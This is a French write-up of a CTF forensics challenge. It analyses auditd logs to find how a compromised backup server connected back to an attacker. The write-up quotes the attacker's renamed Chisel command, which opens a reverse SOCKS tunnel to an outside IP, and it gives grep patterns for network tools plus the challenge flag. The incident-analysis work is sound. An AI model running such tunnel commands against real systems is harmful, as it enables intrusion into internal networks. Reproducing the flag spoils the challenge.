# FCFS 2026 - Forensics - Grhelp Connect back

- **Catégorie :** Forensics

- **Description :** Vous avez les logs auditd d'une infrastructure qui a été compromise. L'attaquant a réussi à exécuter une commande sur un serveur pour que celui-ci se connecte à son serveur de commande et de contrôle (C2). Quelle est la commande exécutée par l'attaquant ? Quel est le nom de la machine compromise qui a exécuté cette commande ? Le flag est la concaténation : `FCSC{machine-commandline}`. [`grhelp-logs-connect.tar.gz`](grhelp-logs-connect.tar.gz)

- **Résumé de l'analyse :** Identification d'un tunnel de pivotement (Reverse SOCKS) via l'outil Chisel (renommé en `./update`) sur le nœud `backupfiler.jurisdefense.intra`, pointant vers l'IP de l'attaquant `15.188.57.187`.

## Analyse

### 1. Stratégie de recherche

L'analyse de logs auditd est complexe car elle mélange les actions système légitimes (bruit) et les actions malveillantes. Pour identifier un "Connect back", nous ciblons les exécutions de commandes (type=EXECVE) impliquant des outils réseau ou des shells :

```bash
grep "type=EXECVE" all.log | grep -Ei "bash|python|nc|socat|chisel"
```

### 2. Filtrage du bruit de fond (Azure & Maintenance)

L'infrastructure étant sur Azure, les logs sont saturés par WALinuxAgent et waagent. Pour y voir plus clair, nous excluons ces processus :

```bash
grep "type=EXECVE" all.log | grep -vE "waagent|WALinuxAgent|debian-sa1"
```

### 3. Pivot sur l'IP de l'attaquant

Grâce à une analyse corrélée (exfiltration préalable via scp), l'adresse IP 15.188.57.187 a été identifiée comme suspecte. Une recherche directe sur cette IP dans les logs permet d'isoler la connexion sortante :

```bash
grep -r "15.188.57.187" logs/
```

### 4. Identification de la preuve
La recherche remonte une ligne critique dans le fichier de log de la machine de backup :

```Plaintext
node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747142884.895:330846): argc=4 a0="./update" a1="client" a2="15.188.57.187:9999" a3="R:socks"
```

Décomposition des arguments :

- `node=backupfiler.jurisdefense.intra` : La machine compromise.

- `a0="./update"` : Le binaire malveillant. L'attaquant l'a renommé pour masquer ses intentions.

- `a1="client", a2="15.188.57.187:9999", a3="R:socks"` : Arguments caractéristiques de l'outil Chisel. Le paramètre R:socks crée un Reverse SOCKS Proxy, permettant à l'attaquant de rebondir depuis sa machine vers tout le réseau interne via ce serveur.

## Interprétation

L'attaque s'est déroulée en plusieurs phases sur `backupfiler` :

1. Reconnaissance : Lecture du `.bash_history` de l'utilisateur `julien.dupont`.

2. Persistance : Téléchargement et exécution du tunnelier.

3. Établissement du tunnel : Exécution de la commande `./update` vers le port 9999 de l'attaquant.

4. Pivot : Utilisation du tunnel pour explorer le LAN et exfiltrer des données (`smb_share.tar.gz`).

###

```text
FCSC{backupfiler.jurisdefense.intra-./update client 15.188.57.187:9999 R:socks}
```